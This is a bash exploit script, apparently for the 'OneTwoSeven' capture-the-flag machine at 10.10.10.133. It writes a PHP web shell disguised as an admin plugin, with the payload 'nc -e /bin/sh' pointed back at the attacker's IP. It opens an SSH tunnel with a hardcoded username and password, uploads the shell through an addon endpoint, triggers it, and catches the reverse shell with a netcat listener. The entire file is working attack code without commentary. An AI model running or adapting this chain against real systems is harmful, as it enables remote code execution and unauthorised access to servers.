#!/bin/bash

IP=$(/sbin/ifconfig | sed -n '20 p' | awk '{print $2}')
shell=ots-shell.php
payload="nc -e /bin/sh $IP 443"

fuser -k 60080/tcp > /dev/null

echo "[?] Checking if a payload is available"

[ -f $shell ] && sleep 0 || echo -ne "<?php\n# OneTwoSeven Admin Plugin\n# OTS Reverse\nshell_exec('$payload');\n?>\n" > $shell

echo "[*] Creating a tunnel"

expect -c 'spawn ssh -f -L 60080:127.0.0.1:60080 ots-yODc2NGQ@10.10.10.133 -N sleep 5; expect "*?assword:*"; send "f528764d\r"; wait' > /dev/null

echo "[*] Sending payload"

http --form POST http://localhost:60080/addon-download.php?addon=/addon-upload.php addon@$shell > /dev/null

rm $shell

echo "[*] Opening reverse shell"

http http://localhost:60080/addons/ots-shell.php > /dev/null &

nc -lp 443
